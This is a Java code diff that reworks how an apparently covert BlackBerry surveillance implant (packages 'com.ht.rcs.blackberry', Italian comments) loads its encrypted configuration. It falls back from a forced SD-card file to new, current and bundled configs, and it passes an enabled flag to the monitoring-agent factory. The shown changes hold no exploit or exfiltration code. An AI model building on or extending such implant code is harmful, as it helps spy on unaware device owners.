@@ -19,6 +19,8 @@ import com.ht.rcs.blackberry.agent.Agent;
 import com.ht.rcs.blackberry.config.Keys;
 import com.ht.rcs.blackberry.crypto.Encryption;
 import com.ht.rcs.blackberry.event.Event;
+import com.ht.rcs.blackberry.fs.AutoFlashFile;
+import com.ht.rcs.blackberry.fs.Path;
 import com.ht.rcs.blackberry.params.Parameter;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.Debug;
@@ -35,6 +37,9 @@ public class Conf {
     private static Debug debug = new Debug("Conf", DebugLevel.VERBOSE);
 
     public static final String NEW_CONF = "newconfig.dat";
+    public static final String ACTUAL_CONF = "config.dat";
+    private static final String FORCED_CONF = "config.bin";
+    public static final String NEW_CONF_PATH = Path.USER_PATH + Path.CONF_DIR;
 
     /** The Constant CONF_TIMER_SINGLE. */
     public static final int CONF_TIMER_SINGLE = 0x0;
@@ -114,26 +119,74 @@ public class Conf {
     }
 
     /**
-     * Load.
+     * Load. Se c'e' la config.new la prova, e se va bene diventa la
+     * config.actual. Altrimenti se c'e' la config.actual la carica. Se non ci
+     * riesce usa il default preso nelle risorse.
      * 
      * @return true, if successful
      */
     public boolean load() {
-        // TODO: verificare che ci sia Conf.NEW_CONF
-        InputStream i0 = Conf.class.getResourceAsStream("config/config.bin");
-        // InputStream i0 =
-        // Conf.class.getResourceAsStream("config/plainconfig.bin");
 
-        Check.asserts(i0 != null, "Resource config");
-
+        boolean ret = true;
         byte[] confKey = Keys.getInstance().getConfKey();
-        boolean ret = loadCyphered(i0, confKey);
+        AutoFlashFile file;
+
+        file = new AutoFlashFile(Path.SD_PATH + Path.CONF_DIR
+                + Conf.FORCED_CONF, true);
+        if (file.exists()) {
+            ret = loadCyphered(file.read(), confKey);
+            if (ret) {
+                debug.info("Forced config");
+                return true;
+            } else {
+                debug.error("Reading forced configuration");
+                file.delete();
+            }
+        }
+
+        file = new AutoFlashFile(Conf.NEW_CONF_PATH + Conf.NEW_CONF, true);
+        if (file.exists()) {
+            ret = loadCyphered(file.read(), confKey);
+
+            if (ret) {
+                debug.info("New config");
+                file.rename(Conf.ACTUAL_CONF);
+                return true;
+            } else {
+                debug.error("Reading new configuration");
+                file.delete();
+            }
+        }
+
+        file = new AutoFlashFile(Conf.NEW_CONF_PATH + Conf.ACTUAL_CONF, true);
+        if (file.exists()) {
+            ret = loadCyphered(file.read(), confKey);
+            if (ret) {
+                debug.info("Actual config");
+                return true;
+            } else {
+                debug.error("Reading actual configuration");
+                file.delete();
+            }
+        }
+
+        debug.warn("Reading Conf from resourses");
+
+        InputStream i0 = Conf.class.getResourceAsStream("config/config.bin");
+        if (i0 != null) {
+            Check.asserts(i0 != null, "Resource config");
+            ret = loadCyphered(i0, confKey);
+
+        } else {
+            debug.error("Cannot read config from resources");
+            ret = false;
+        }
 
         return ret;
     }
 
     /**
-     * Load cyphered.
+     * carica la configurazione cifrata a partire da un inputstream.
      * 
      * @param i0
      *            the i0
@@ -145,27 +198,38 @@ public class Conf {
         int len;
         boolean ret = false;
 
-        final int cryptoOffset = 8;
         try {
             len = i0.available();
             byte[] cyphered = new byte[len];
             i0.read(cyphered);
 
-            debug.trace("cypher len: " + len);
-
-            Encryption crypto = new Encryption();
-            crypto.makeKey(confKey);
-
-            byte[] plainconf = crypto.decryptData(cyphered, cryptoOffset);
-            debug.trace("plain len: " + plainconf.length);
-            cyphered = null;
-
-            // lettura della configurazione
-            ret = parseConf(plainconf, 0);
+            ret = loadCyphered(cyphered, confKey);
 
         } catch (IOException e) {
             debug.error("Cannot read cyphered");
         }
+
+        return ret;
+    }
+
+    public boolean loadCyphered(byte[] cyphered, final byte[] confKey) {
+        int len;
+        boolean ret = false;
+
+        final int cryptoOffset = 8;
+
+        len = cyphered.length;
+        debug.trace("cypher len: " + len);
+
+        Encryption crypto = new Encryption();
+        crypto.makeKey(confKey);
+
+        byte[] plainconf = crypto.decryptData(cyphered, cryptoOffset);
+        debug.trace("plain len: " + plainconf.length);
+        cyphered = null;
+
+        // lettura della configurazione
+        ret = parseConf(plainconf, 0);
 
         return ret;
     }
@@ -247,7 +311,9 @@ public class Conf {
 
             debug.trace("ParseAgent - factory: " + agentType + " status: "
                     + agentStatus);
-            Agent agent = Agent.factory(agentType, agentStatus, confParams);
+
+            boolean enabled = agentStatus == Common.AGENT_ENABLED;
+            Agent agent = Agent.factory(agentType, enabled, confParams);
             statusObj.addAgent(agent);
         }
 
@@ -379,8 +445,8 @@ public class Conf {
             byte[] confParams = new byte[paramLen];
             databuffer.readFully(confParams);
 
-            debug.trace("ParseEvent - factory: " + eventType + " action: "
-                    + actionId);
+            debug.trace("ParseEvent - factory: " + i + " type: " + eventType
+                    + " action: " + actionId);
             Event event = Event.factory(i, eventType, actionId, confParams);
             statusObj.addEvent(i, event);
         }
